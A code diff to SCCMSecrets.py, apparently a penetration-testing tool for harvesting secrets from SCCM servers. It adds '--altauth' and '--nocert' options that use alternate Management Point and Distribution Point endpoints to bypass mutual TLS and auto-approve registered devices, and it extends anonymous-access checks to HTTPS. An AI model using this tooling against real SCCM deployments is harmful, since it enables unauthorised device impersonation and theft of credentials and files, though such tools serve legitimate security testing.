@@ -39,7 +39,7 @@ def policies(
     use_existing_device: Annotated[str, typer.Option("--use-existing-device", "-d", help="[Optional] This option can be used to re-run SCCMSecrets.py using a previously registered device ; or to impersonate a legitimate SCCM client. In both cases, it expects the path of a folder containing a guid.txt file (the SCCM device GUID) and the key.pem file (the client's private key). Note that a client-name value must also be provided to SCCMSecrets (but does not have to match the one of the existing device)")] = None,
     pki_cert: Annotated[str, typer.Option("--pki-cert", "-c", help="[Optional] The path to a valid domain PKI certificate in PEM format. Required when the Management Point enforces HTTPS and thus client certificate authentication")] = None,
     pki_key: Annotated[str, typer.Option("--pki-key", "-k", help="[Optional] The path to the private key of the certificate in PEM format")] = None,
-    mtls_bypass: Annotated[bool, typer.Option("--mtls-bypass", "-b", help="[Optional] Enable mutual TLS bypass")] = False,
+    altauth: Annotated[bool, typer.Option("--altauth", "-a", help="[Optional] Use the MP's alternate authentication endpoint. This endpoint bypasses mutual TLS requirements, and automatically approves devices registered through it. It only works when the MP uses HTTPS AND HTTPS is enforced site-wide")] = False,
     verbose: Annotated[bool, typer.Option("--verbose", "-v", help="[Optional] Enable verbose output")] = False
 ):
     print_banner()
@@ -58,8 +58,8 @@ def policies(
     if machine_hash is not None and len(machine_hash) != 32:
         logger.error(f"{bcolors.FAIL}[!] The provided NT hash does not have the expected format (e.g. A4F49C406510BDCAB6824EE7C30FD852){bcolors.ENDC}")
         return
-    if management_point.startswith('https://') and not mtls_bypass and (pki_cert is None or pki_key is None):
-        logger.error(f"{bcolors.FAIL}[!] When using https, SCCM requires client certificate authentication. You have to provide a client certificate with the --pki-cert and --pki-key flags or use the --mtls-bypass flag{bcolors.ENDC}")
+    if management_point.startswith('https://') and not altauth and (pki_cert is None or pki_key is None):
+        logger.error(f"{bcolors.FAIL}[!] When using https, SCCM requires client certificate authentication. You have to provide a client certificate with the --pki-cert and --pki-key flags or use the --altauth flag to bypass the requirement{bcolors.ENDC}")
         return
     if machine_pass is None and machine_hash is not None:
         machine_pass = '0' * 32 + ':' + machine_hash
@@ -82,7 +82,8 @@ def policies(
     if machine_name is not None:
         lines.append(f" - Machine account provided: {machine_name}")
     else:
-        lines.append(f" - Machine account provided: none (anonymous registration or existing device)")
+        lines.append(f" - Machine account provided: none (anonymous registration, altauth or existing device)")
+    lines.append(f" - Using alternate authentication endpoint: {altauth}")
     lines.append(f" - Client name for the device: {client_name}")
     lines.append(f" - Registration sleep (in seconds): {registration_sleep}")
     lines.append(f" - Output directory: {bcolors.BOLD}./loot/{output_dir}{bcolors.ENDC}")
@@ -101,7 +102,7 @@ def policies(
         machine_pass,
         pki_cert,
         pki_key,
-        mtls_bypass
+        altauth
     )
 
     if use_existing_device is None:
@@ -159,6 +160,7 @@ def files(
     max_recursion: Annotated[int, typer.Option("--max-recursion", "-r", help="[Optional] The maximum recursion depth when indexing files from the Distribution Point")] = 10,
     pki_cert: Annotated[str, typer.Option("--pki-cert", "-c", help="[Optional] The path to a valid domain PKI certificate in PEM format. Required when the Distribution Point enforces HTTPS and thus client certificate authentication")] = None,
     pki_key: Annotated[str, typer.Option("--pki-key", "-k", help="[Optional] The path to the private key of the certificate in PEM format")] = None,
+    nocert: Annotated[bool, typer.Option("--nocert", "-n", help="[Optional] Use the DP's nocert endpoint. This endpoint bypasses mutual TLS requirements")] = False,
     verbose: Annotated[bool, typer.Option("--verbose", "-v", help="[Optional] Enable verbose output")] = False
 ):
     print_banner()
@@ -176,19 +178,16 @@ def files(
     if hash is not None and len(hash) != 32:
         logger.error(f"{bcolors.FAIL}[!] The provided NT hash does not have the expected format (e.g. A4F49C406510BDCAB6824EE7C30FD852){bcolors.ENDC}")
         return
-    if distribution_point.startswith('https://') and (pki_cert is None or pki_key is None):
-        logger.error(f"{bcolors.FAIL}[!] When using https, SCCM requires client certificate authentication. You have to provide a client certificate with the --pki-cert and --pki-key flags{bcolors.ENDC}")
+    if distribution_point.startswith('https://') and nocert is False and (pki_cert is None or pki_key is None):
+        logger.error(f"{bcolors.FAIL}[!] When using https, SCCM requires client certificate authentication. You have to provide a client certificate with the --pki-cert and --pki-key flags, or provide the --nocert flag to bypass the requirement{bcolors.ENDC}")
         return
     if password is None and hash is not None:
         password = '0' * 32 + ':' + hash
     extensions = [] if not extensions else [x.strip() for x in extensions.split(',')]
     extensions = list(filter(None, extensions))
 
-    # Checking for Distribution Point anonymous access in case we are using plain HTTP. In HTTPS, the option is not available
-    if not distribution_point.startswith('https://'):
-        anonymousDPConnectionEnabled = FileDumper.check_anonymous_DP_connection_enabled(distribution_point)
-    else:
-        anonymousDPConnectionEnabled = ANONYMOUSDP.DISABLED.value
+    # Checking for Distribution Point anonymous access in case we are using plain HTTP. In HTTPS, the option is not available. EDIT: Still checking in HTTPS cases
+    anonymousDPConnectionEnabled = FileDumper.check_anonymous_DP_connection_enabled(distribution_point, nocert)
 
     # Output directory creation
     if not os.path.exists('loot'):
@@ -203,9 +202,12 @@ def files(
         lines.append(f" - Anonymous Distribution Point access: {bcolors.OKGREEN}{bcolors.BOLD}[VULNERABLE]{bcolors.ENDC} Distribution point allows anonymous access{bcolors.ENDC}")
     elif anonymousDPConnectionEnabled == ANONYMOUSDP.DISABLED.value:
         lines.append(f" - Anonymous Distribution Point access: {bcolors.FAIL}{bcolors.BOLD}[NOT VULNERABLE]{bcolors.ENDC} (distribution point does not allow anonymous access)")
+    elif anonymousDPConnectionEnabled == ANONYMOUSDP.CLIENTCERT.value:
+        lines.append(f" - Anonymous Distribution Point access: {bcolors.FAIL}{bcolors.BOLD}[NOT VULNERABLE]{bcolors.ENDC} (client certificate required)")
     else:
         lines.append(f" - Anonymous Distribution Point access: {bcolors.FAIL}{bcolors.BOLD}[UNKNOWN]{bcolors.ENDC} Unexpected anonymous access check result{bcolors.ENDC}")
     lines.append(f" - Distribution point: {distribution_point}")
+    lines.append(f" - Nocert endpoint: {nocert}")
     lines.append(f" - File extensions to retrieve: {extensions if urls is None else 'N/A (url list provided)'}")
     lines.append(f" - Output directory: {bcolors.BOLD}./loot/{output_dir}{bcolors.ENDC}")
     split_lines = [line.split(':', 1) for line in lines]
@@ -229,7 +231,8 @@ def files(
         username,
         password ,
         pki_cert,
-        pki_key
+        pki_key,
+        nocert
     )
 
     try:
